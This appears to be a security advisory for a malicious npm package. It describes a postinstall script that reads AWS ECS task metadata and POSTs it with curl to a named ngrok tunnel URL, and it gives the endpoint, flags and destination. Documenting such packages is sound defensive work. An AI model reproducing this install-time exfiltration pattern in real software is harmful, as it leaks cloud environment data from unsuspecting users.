summary: postinstall exfiltrates AWS ECS task metadata to attacker-controlled ngrok endpoint
details: package.json declares a postinstall lifecycle script that runs on `npm install`. The script queries the AWS ECS container task metadata endpoint (`$ECS_CONTAINER_METADATA_URI_V4/task`) and POSTs the response body to a hardcoded ngrok tunnel at https://mourner-slot-explicit.ngrok-free.dev via `curl -X POST --data-binary @-`. The exfiltrated data includes container identifiers and CloudWatch awslogs group/stream names, and the destination is an anonymous ngrok-free.dev tunnel unrelated to any legitimate publisher. The behavior fires automatically on install and matches a dependency-confusion reconnaissance payload.

cwes.description: The product contains code that appears to be malicious in nature.
